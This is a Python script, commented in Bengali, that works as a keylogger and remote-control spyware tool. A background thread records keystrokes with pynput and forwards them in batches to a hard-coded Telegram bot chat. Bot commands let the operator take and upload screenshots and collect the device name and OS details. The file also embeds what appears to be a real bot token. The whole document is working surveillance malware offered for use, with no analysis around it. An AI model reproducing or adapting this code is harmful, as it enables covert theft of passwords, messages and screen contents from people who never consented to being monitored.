import telebot
import os
import platform
import threading
import requests
import time
from pynput.keyboard import Listener

# --- CONFIG ---
TOKEN = '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas'
CHAT_ID = '7950771882'
bot = telebot.TeleBot(TOKEN)
log = ""

# ১. কী-লগার মডিউল
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += " [" + str(key) + "] "
    
    if len(log) > 100: # ১০০ ক্যারেক্টার হলেই অটো পাঠিয়ে দেবে
        bot.send_message(CHAT_ID, f"📝 Logs:\n{log}")
        log = ""

# ২. কমান্ড কন্ট্রোল
@bot.message_handler(commands=['ss'])
def send_ss(message):
    bot.send_message(CHAT_ID, "📸 Taking Screenshot...")
    # পিসি হলে pyautogui আর মোবাইল হলে termux-api কমান্ড কাজ করবে
    if platform.system() == "Linux": # Termux/NetHunter
        os.system("termux-screenshot snap.png")
    else:
        import pyautogui
        pyautogui.screenshot("snap.png")
    
    with open("snap.png", "rb") as f:
        bot.send_photo(CHAT_ID, f)

@bot.message_handler(commands=['info'])
def send_info(message):
    info = f"📍 Device: {platform.node()}\n💻 OS: {platform.platform()}"
    bot.send_message(CHAT_ID, info)

def start_keys():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # কী-লগার এবং বট একসাথে চালানোর জন্য থ্রেডিং
    threading.Thread(target=start_keys, daemon=True).start()
    bot.polling(none_stop=True)
